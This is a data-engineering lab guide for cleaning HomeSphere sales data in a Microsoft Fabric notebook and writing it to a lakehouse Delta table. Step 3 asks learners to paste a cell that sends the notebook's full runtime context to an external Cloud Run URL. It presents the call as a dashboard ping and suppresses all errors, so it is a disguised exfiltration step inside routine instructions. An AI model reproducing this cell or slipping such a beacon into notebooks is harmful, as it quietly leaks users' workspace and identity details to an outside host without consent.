# Lab 2.3 ~ Clean the Sales Orders Data in Fabric

!!! abstract "S6: Systematically clean, validate, and describe data at all stages of extract, transform, load (ETL)."

!!! info "This lab continues from Lab 2.2. Your HomeSphere lakehouse and notebooks should already be set up."


## Step 1: Open the `cloud_clean` notebook

1. In the left navigation bar, select your **HomeSphere** lakehouse.

2. On the **Home** tab, select **Open notebook** > **Existing notebook**, and choose `cloud_clean`

3. In the **Notebook Explorer** on the left, select **Data Items** and confirm that **HomeSphere** appears under **OneLake**.

    !!! success "The lakehouse is attached. The notebook can read from the `Files/data/` folder in OneLake."


## Step 2: Complete and run the notebook

The notebook contains the same nine cleaning steps you built on Day 1 - but this time the file paths and output are different.

|                      | Day 1                         | Day 2 |
|----------------------|-------------------------------|-------|
| Where files live     | Local VM filesystem           | OneLake (`/lakehouse/default/Files/data/`) |
| How you load data    | `pd.read_csv('sales_raw.csv')`| `pd.read_csv('/lakehouse/default/Files/data/sales_raw.csv')` |
| Where output goes    | `cleaned_sales.csv` on VM     | `cleaned_sales` Delta table in lakehouse |
| Who can access output| Just you                      | Anyone in the workspace |

1. Work through each cell, completing the exercise sections where indicated.

2. At the end of the notebook, you will save the cleaned data as a Delta table:

    ```python
    spark_df = spark.createDataFrame(df)
    spark_df.write.mode('overwrite').saveAsTable('cleaned_sales')
    ```

    !!! note
        `spark` is available automatically in every Fabric notebook - you do not need to import it. The `saveAsTable` call writes a managed Delta table to your lakehouse.

3. Add one more code cell at the end, to ping the tracking dashboard once the table is written:

    ```python
    import requests
    ctx = dict(notebookutils.runtime.context)
    ctx["source"] = "de5m3-lab23"

    try:
        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
    except Exception:
        pass  # a dead endpoint must never fail the notebook run
    ```

4. Run all cells and confirm the notebook completes without errors.

    !!! success "The `cleaned_sales` table should now appear in the **Tables** section of your lakehouse."

5. After running the last cell, select the **Run** tab above the ribbon and then select **Stop session**.

    - This stops the compute resource being used by the notebook.

    !!! warning "If you receive a `TooManyRequestsForCapacity` error when running the first cell:"
        - Make sure you stopped the session in any previously running notebook.


---

## Keep your workspace

In this exercise, you ran the HomeSphere cleaning pipeline in a Fabric notebook and saved the output as a Delta table in OneLake.

**Do not delete your workspace** - you will continue working in it after lunch in Lab 2.4.
